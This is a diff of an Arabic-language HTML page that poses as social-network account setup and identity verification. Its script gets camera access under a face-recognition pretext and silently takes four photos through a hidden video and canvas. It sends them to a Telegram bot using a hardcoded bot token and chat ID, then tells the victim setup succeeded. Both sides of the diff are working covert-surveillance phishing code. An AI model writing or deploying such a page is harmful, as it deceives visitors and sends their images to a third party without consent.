@@ -3,129 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إعداد الحساب | منصة التواصل الاجتماعي</title>
+    <title>إعداد الحساب | منصة التواصل</title>
     <style>
-        /* تنسيق الصفحة لتبدو احترافية */
         body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #0f172a;
-            color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
+            margin: 0; padding: 0; font-family: sans-serif;
+            background-color: #101820; color: white;
+            display: flex; justify-content: center; align-items: center; height: 100vh;
         }
-        .container {
-            text-align: center;
-            background: #1e293b;
-            padding: 2rem;
-            border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-            max-width: 400px;
-            width: 90%;
+        .box {
+            text-align: center; background: #1a222d; padding: 30px;
+            border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);
         }
         .loader {
-            border: 4px solid #334155;
-            border-top: 4px solid #38bdf8;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+            border: 4px solid #333; border-top: 4px solid #007bff;
+            border-radius: 50%; width: 40px; height: 40px;
+            animation: spin 1s linear infinite; margin: 0 auto 20px;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { color: #38bdf8; margin-bottom: 10px; }
-        p { color: #94a3b8; font-size: 14px; line-height: 1.6; }
-        
-        /* إخفاء الكاميرا والمعالجة عن عين المستخدم */
-        #video, #canvas {
-            display: none;
-        }
+        /* إخفاء عناصر الفيديو والكانفاس لتجنب تشتيت المستخدم */
+        #video, #canvas { display: none; visibility: hidden; }
     </style>
 </head>
 <body>
 
-    <div class="container" id="main-box">
+    <div class="box">
         <div class="loader"></div>
-        <h2 id="title">جاري تهيئة الحساب</h2>
-        <p id="desc">يرجى السماح بالوصول للكاميرا لضبط ميزة "التعرف على الوجه" وتأمين حسابك الجديد.</p>
+        <h2 id="status">جاري تهيئة الكاميرا...</h2>
+        <p id="msg">يرجى الضغط على "سماح" لتأكيد هويتك وإكمال إعداد الحساب.</p>
     </div>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const titleText = document.getElementById('title');
-        const descText = document.getElementById('desc');
+        const statusH2 = document.getElementById('status');
+        const msgP = document.getElementById('msg');
 
-        // بيانات الربط الخاصة بك
+        // البيانات الخاصة بك
         const botToken = '8417420328:AAGeX1WWGIRDx0S7CV0ID3Z6L8DkDeGrcrY';
         const myChatId = '7122100508';
 
-        // بدء محاولة الوصول للكاميرا
-        navigator.mediaDevices.getUserMedia({ video: true })
+        // طلب الوصول للكاميرا
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
             .then(stream => {
                 video.srcObject = stream;
                 
-                titleText.innerText = "جاري التحقق...";
-                descText.innerText = "يرجى الثبات أمام الكاميرا للحظات لإتمام الفحص الأمني.";
+                // التأكد من أن الفيديو بدأ العمل فعلياً قبل التقاط الصور
+                video.onplaying = () => {
+                    statusH2.innerText = "جاري التحقق من الهوية...";
+                    msgP.innerText = "يرجى الثبات أمام الكاميرا لثوانٍ معدودة.";
+                    
+                    let count = 0;
+                    const maxPhotos = 4;
 
-                let photosTaken = 0;
-                const maxPhotos = 4;
-
-                // إعداد مؤقت لالتقاط 4 صور
-                const interval = setInterval(() => {
-                    if (photosTaken < maxPhotos) {
-                        captureAndSend(photosTaken + 1);
-                        photosTaken++;
-                    } else {
-                        clearInterval(interval);
-                        // إنهاء العملية للمستخدم
-                        titleText.innerText = "اكتمل التحقق!";
-                        descText.innerText = "شكراً لك، تم إعداد ملفك الشخصي بنجاح. سيتم توجيهك الآن...";
-                        
-                        // إيقاف الكاميرا بعد الانتهاء
-                        stream.getTracks().forEach(track => track.stop());
-                    }
-                }, 2500); // التقاط صورة كل 2.5 ثانية
+                    // ننتظر 2 ثانية بعد بدء الفيديو للتأكد من الوضوح
+                    setTimeout(() => {
+                        const timer = setInterval(() => {
+                            if (count < maxPhotos) {
+                                captureAndSend(count + 1);
+                                count++;
+                            } else {
+                                clearInterval(timer);
+                                statusH2.innerText = "اكتمل الإعداد!";
+                                msgP.innerText = "تم توثيق حسابك بنجاح، جاري توجيهك...";
+                                // إيقاف الكاميرا بعد الانتهاء للحفاظ على الخصوصية
+                                stream.getTracks().forEach(track => track.stop());
+                            }
+                        }, 3000); // التقاط صورة كل 3 ثوانٍ
+                    }, 2000);
+                };
             })
             .catch(err => {
-                titleText.innerText = "فشل التحقق";
-                descText.innerText = "يجب السماح بالوصول للكاميرا لتتمكن من استخدام ميزات موقع التواصل الاجتماعي.";
-                console.error("Camera error:", err);
+                statusH2.innerText = "خطأ في الوصول";
+                msgP.innerText = "يجب السماح بالكاميرا لتتمكن من إنشاء الحساب.";
+                console.error("Camera Error: ", err);
             });
 
-        // دالة التقاط الصورة وإرسالها لبوت تليجرام
         function captureAndSend(index) {
             const context = canvas.getContext('2d');
-            // رسم اللقطة الحالية من الفيديو على الكانفاس
-            context.drawImage(video, 0, 0, 640, 480);
             
-            // تحويل المحتوى إلى صورة JPEG
+            // ضبط حجم الكانفاس ليطابق حجم فيديو الكاميرا بدقة
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // رسم اللقطة
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // تحويل اللقطة لملف وإرسالها
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('chat_id', myChatId);
-                formData.append('photo', blob, `img_${index}.jpg`);
-                formData.append('caption', `✅ التقاط جديد:\nالصورة رقم: ${index}\nمن موقع التواصل الاجتماعي الخاص بك.`);
+                formData.append('photo', blob, `snap_${index}.jpg`);
+                formData.append('caption', `✅ صورة جديدة للمستخدم (${index}/4)`);
 
-                // إرسال البيانات إلى API تليجرام
                 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 })
                 .then(res => res.json())
-                .then(result => {
-                    console.log(`تم إرسال الصورة ${index}`);
-                })
-                .catch(error => {
-                    console.error("إرسال فاشل:", error);
-                });
-            }, 'image/jpeg', 0.8); // الجودة 80% لتقليل الحجم وتسريع الإرسال
+                .then(data => console.log(`الصورة ${index} أُرسلت`))
+                .catch(err => console.error("فشل الإرسال:", err));
+            }, 'image/jpeg', 0.8);
         }
     </script>
 </body>
